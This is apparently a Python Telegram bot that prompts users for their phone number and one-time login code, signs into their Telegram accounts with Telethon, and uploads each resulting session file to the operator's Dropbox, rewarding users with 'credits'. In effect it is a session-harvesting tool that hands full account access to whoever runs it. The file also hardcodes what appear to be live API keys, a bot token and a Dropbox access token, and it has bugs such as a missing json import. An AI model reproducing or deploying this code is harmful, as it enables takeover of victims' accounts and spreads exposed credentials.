




import os
import asyncio
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes, ConversationHandler
from telethon import TelegramClient
import dropbox

# ---- Your Telegram API keys ----
API_ID = 28863669  # <-- Replace with your API ID (integer)
API_HASH = "72b4ff10bcce5ba17dba09f8aa526a44"  # <-- Replace with your API HASH (string)

# Your Bot Token from BotFather
BOT_TOKEN = "7403077617:AAHpamE_hj-cuNb2kHECiMjD3oSddO_iR20"

# ---- Dropbox API Integration ----
DROPBOX_ACCESS_TOKEN = "sl.u.AFsiDN3tPs973d4xL9bBbHijOQum2bSocEcfAk51OK3VUcO4B3_vDR6kRZJDPIloE-RgKeIBxIBKkuaZzoAe-ePTHOMqKjYmFQlTVo1ybiz2vCpG_QcyM_qZFLcWDZ3PcBT--tQEnKyDJYwYTuRYT-kf6Gc37yo4giSqCM7wE366Oz2Ec0JJcdSjYy3xBZF7y88NyoZ47sK9XTmcvO1PqK-L-rUVk1zFr_8MJmG70_mihGBDGP7SXYGuuIll2_zSKtn4yzzhRcRNm-h6x99ZHvHyAWAaEp3nAon1EgpfZ64WQu-gJYAJrYQDAhbya4gXkHbzdxRlfWn_56a5K5xeJDtfbQBw1KsIg7GONr7uC3zWdVolZDwsNEq4qL0FKC6KdD0ZaLosFVz7bA6n-ep_Cx_edfvA6QRG-v0lGhdXzZt-zofjuYbcs7SWVPH2ImZPRyX6AwIsfUre1rR4sIOcmhGvhH4JdRT5qCwgRRkZD-V-Riv_7Vg3CKcRwMhlQPq0L3rEhNbDxeIT5E9fhAoxrzyDxbUrG27pwKzfUcEqoXGqI79AXB64MNN__okKzq1h9btS5Y4uKNasQwALCSw1TZS7rKVOUs2KI5Nt99MRM5KIetBXdmdMJSosWSYbQRs1jzQLeRsRMDPUXe8c5ihLE1d-Ot0FALQ_FPlKzzIF0F7gAcYbKq7C0eaMRYq35N8aZM9gKXpYRQU8wAkhmOkavdrjLN0UAW1r1FmhvbJz0m7OJ3KOFIQhaOqx6t88FZICCAcSpZk6JIpshEpl2OBCJzDa23h97eG498NOovgWw4suriIznIgLObcSQxot6ec8SWod_RC8hO5KIgQ6qEXuzpTEidygQkd1mk2aaT0-xwibP5Jswila_OTfEtGFKr0M_7DHBaD5nWSx84KZVqeR88FA3TCFKiSSc9ulXJTZIfMdtltkXVe-JOecekgG6YTuWTi2fQ1xjhcRs3cu4w8dPZvf23pJJmKb3WGrJYZDQBYlAvE1SdyHrzjK7I1Mzx69ZseDBsvVwvvnhrG3F_dL1G77mTkMPj-z-u7B4O-_GtwuO-Qkalr-xbBBB870Rt4obTHPcVzT9G-pCNx7En7H93uqw7y0uAs0jf47Uup60YJDybu2poTYlYdotXVAc3ln2Q5OIKBSLrSxnMGIIAn1epycX0W7vicsocMO9JJlb1O1KUcMULzpZvzqoXSQjnR9pO1P4ZcQmPoXM4eLPK5WUzWvqunNsC-T2w-kYRmoU1QQIpyKc4-FgyX_Q3muZEr8i093j50f8uHGM27AVjuVNE33bBYrgS3xrh6uiCTWyAA4sM6ZlNdKRMtJa1-AeHIaxP_VxSzcBN3AvC-cM_Mr04CZMEdesfB-vmIKTdEYkepvTHoPJBFhQJGmLfJSu5Eq_pg_y63oDK2gxrqMt4f7esvjDW90x_jFsPsstyXVeD9Rtf_Qhu9FOVTo5QGX_gmke87Tv8v8Bvfo93eyBZRgxNpp"  # <-- Replace with your Dropbox access token
dbx = dropbox.Dropbox(DROPBOX_ACCESS_TOKEN)

# ---- States for Conversation ----
ASK_PHONE, ASK_CODE = range(2)

# ---- Dictionary to track users' login states ----
user_sessions = {}

# ---- Start Command ----
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("👋 Hello! Send me your phone number (with country code, e.g., +123456789).")
    return ASK_PHONE

# ---- Handle Phone Number ----
async def ask_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    phone = update.message.text.strip()
    user_id = update.message.from_user.id

    # Validate phone number format
    if not phone.startswith('+'):
        await update.message.reply_text("❌ Please enter a valid phone number with country code (e.g., +123456789).")
        return ASK_PHONE

    # Create a new Telethon client for this user
    session_name = f"sessions/{phone}"  # Saving sessions inside 'sessions' folder
    os.makedirs("sessions", exist_ok=True)
    client = TelegramClient(session_name, API_ID, API_HASH)

    try:
        await client.connect()
        await client.send_code_request(phone)
        user_sessions[user_id] = {"client": client, "phone": phone}
        await update.message.reply_text("📨 OTP code sent! Please send the code you received.")
        return ASK_CODE
    except Exception as e:
        await update.message.reply_text(f"❌ An error occurred: {str(e)}")
        return ASK_PHONE

# ---- Handle OTP Code ----
async def ask_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    code = update.message.text.strip()

    session = user_sessions.get(user_id)
    if not session:
        await update.message.reply_text("Session expired. Please /start again.")
        return ConversationHandler.END

    client = session["client"]
    phone = session["phone"]

    try:
        await client.sign_in(phone, code)
        await update.message.reply_text("✅ Logged in successfully!")

        # After successful login, upload session to Dropbox
        await upload_session_to_dropbox(client, phone)

        # Adding credits (temporary logic for testing)
        await add_credit(user_id, 1)  # Add 1 credit as an example

        await client.disconnect()
        return ConversationHandler.END
    except Exception as e:
        await update.message.reply_text(f"❌ Error while signing in: {str(e)}")
        return ASK_CODE

# ---- Upload Session File to Dropbox ----
async def upload_session_to_dropbox(client, phone):
    session_file_path = f"sessions/{phone}.session"
    dropbox_path = f"/sessions/{phone}.session"

    if not os.path.exists(session_file_path):
        print(f"❌ Session file not found for {phone}. Skipping upload.")
        return

    with open(session_file_path, "rb") as f:
        dbx.files_upload(f.read(), dropbox_path, mode=dropbox.files.WriteMode("overwrite"))

    print(f"✅ Session file for {phone} uploaded to Dropbox.")

# ---- Adding Credits Function ----
async def add_credit(user_id, credits):
    # Here, you can either store the credit in a local database or a JSON file
    user_file = f"credits/{user_id}.json"
    if os.path.exists(user_file):
        with open(user_file, "r") as f:
            user_data = json.load(f)
        user_data["credits"] += credits
    else:
        user_data = {"credits": credits}

    with open(user_file, "w") as f:
        json.dump(user_data, f)

    return user_data["credits"]

# ---- View Credits Command ----
async def view_credits(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    user_file = f"credits/{user_id}.json"

    if os.path.exists(user_file):
        with open(user_file, "r") as f:
            user_data = json.load(f)
        await update.message.reply_text(f"Your current credit balance is: {user_data['credits']} credits.")
    else:
        await update.message.reply_text("You don't have any credits yet. Please log in first.")

# ---- Cancel Command ----
async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ Operation cancelled. Use /start to begin again.")
    return ConversationHandler.END

# ---- Main Function ----
def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('start', start)],
        states={
            ASK_PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, ask_phone)],
            ASK_CODE: [MessageHandler(filters.TEXT & ~filters.COMMAND, ask_code)],
        },
        fallbacks=[CommandHandler('cancel', cancel)],
    )

    app.add_handler(conv_handler)
    app.add_handler(CommandHandler('credits', view_credits))

    print("Bot running...")
    app.run_polling()

if __name__ == '__main__':
    asyncio.run(main())
